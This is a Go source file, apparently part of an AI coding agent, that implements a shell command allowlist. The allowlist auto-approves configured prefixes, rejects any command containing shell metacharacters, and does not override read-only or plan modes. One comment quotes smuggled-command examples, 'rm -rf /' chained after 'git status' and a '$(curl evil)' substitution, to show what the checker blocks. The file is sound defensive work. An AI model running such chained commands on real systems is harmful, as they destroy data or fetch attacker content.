package tools

import (
	"encoding/json"
	"strings"
)

// ShellAllowlist is execpolicy-lite: user-configured command prefixes
// that are safe enough to run without prompting even in ask mode
// (`git status`, `go test`, ...). Matching is token-wise prefix: the
// command's first tokens must equal the configured tokens verbatim —
// "git status" matches "git status --short" but not "git push", and no
// shell metacharacter can smuggle past it (any parse ambiguity fails
// closed to "not safe").
type ShellAllowlist struct {
	prefixes [][]string
}

// NewShellAllowlist tokenizes each configured prefix. Prefixes that do
// not tokenize cleanly are dropped, not guessed at.
func NewShellAllowlist(raw []string) *ShellAllowlist {
	a := &ShellAllowlist{}
	for _, p := range raw {
		if toks := shellWords(p); len(toks) > 0 {
			a.prefixes = append(a.prefixes, toks)
		}
	}
	if len(a.prefixes) == 0 {
		return nil
	}
	return a
}

// unsafeShellChars make a command impossible to vouch for as written:
// operators, redirections, and substitution triggers. They are checked
// after quote stripping, so even a quoted metacharacter denies —
// conservative by design: "git status ; rm -rf /" and
// "git status $(curl evil)" must never auto-run because they start
// with two innocent tokens.
const unsafeShellChars = ";|&$`<>()"

// Allows reports whether command matches any configured prefix.
func (a *ShellAllowlist) Allows(command string) bool {
	if a == nil {
		return false
	}
	toks := shellWords(command)
	if len(toks) == 0 {
		return false
	}
	for _, tok := range toks {
		if strings.ContainsAny(tok, unsafeShellChars) {
			return false
		}
	}
	for _, p := range a.prefixes {
		if len(toks) < len(p) {
			continue
		}
		match := true
		for i := range p {
			if toks[i] != p[i] {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}

// shellCommand extracts the command from run_shell's args JSON.
func shellCommand(args string) (string, error) {
	var a struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal([]byte(args), &a); err != nil {
		return "", err
	}
	return a.Command, nil
}

// shellWords splits a command into shell words with single/double
// quoting. An unterminated quote yields nil — a command we cannot
// tokenize exactly is a command we cannot vouch for.
func shellWords(s string) []string {
	var out []string
	var cur strings.Builder
	inWord := false
	inSingle, inDouble := false, false
	for _, r := range s {
		switch {
		case inSingle:
			if r == '\'' {
				inSingle = false
			} else {
				cur.WriteRune(r)
			}
		case inDouble:
			if r == '"' {
				inDouble = false
			} else {
				cur.WriteRune(r)
			}
		case r == '\'':
			inSingle = true
			inWord = true
		case r == '"':
			inDouble = true
			inWord = true
		case r == ' ' || r == '\t' || r == '\n':
			if inWord {
				out = append(out, cur.String())
				cur.Reset()
				inWord = false
			}
		default:
			cur.WriteRune(r)
			inWord = true
		}
	}
	if inSingle || inDouble {
		return nil // unterminated quote: fail closed
	}
	if inWord {
		out = append(out, cur.String())
	}
	return out
}

// ShellPolicyDecide extends PolicyDecide with the allowlist: a
// matching shell command runs without consulting the prompt (the gate
// still logs it). The mode's posture dominates — read-only and plan
// deny action-tier calls outright, allowlist or not, and a nil
// allowlist behaves exactly like PolicyDecide.
func ShellPolicyDecide(mode string, prompt func(Tool, string) bool, allow *ShellAllowlist) func(Tool, string) bool {
	base := PolicyDecide(mode, prompt)
	if allow == nil {
		return base
	}
	return func(tool Tool, args string) bool {
		switch NormalizeMode(mode) {
		case ModeReadOnly, ModePlan:
			return base(tool, args) // the posture is the promise: no bypass
		}
		if _, ok := tool.(RunShell); ok {
			if cmd, err := shellCommand(args); err == nil && allow.Allows(cmd) {
				return true
			}
		}
		return base(tool, args)
	}
}
